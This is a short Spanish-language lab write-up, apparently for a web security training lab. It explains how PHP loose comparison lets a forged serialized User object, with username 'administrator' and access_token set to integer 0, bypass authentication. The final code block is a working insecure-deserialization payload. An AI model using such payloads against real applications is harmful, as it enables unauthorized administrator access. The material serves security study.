---
title: "2 - Modifying serialized data types"
---

# 2 - Modifying serialized data types

2 propiedades, username y access token

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mxjbh44njh5ym71pdvh8rxq3cn0v3pex";}
```

```php
var_dump(0 == "0");       // true (int 0 se convierte en string "0")
var_dump(0 == "0.0");     // true (ambos se convierten en float 0.0)
var_dump(0 == "");        // true (string vacío se convierte en 0)
var_dump("123" == 123);   // true (string "123" se convierte en int 123)
var_dump(false == "0");   // true (string "0" se convierte en int 0, y false == 0)
```

```php
0 == "password"
```

Cambiamos el objeto PHP :

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
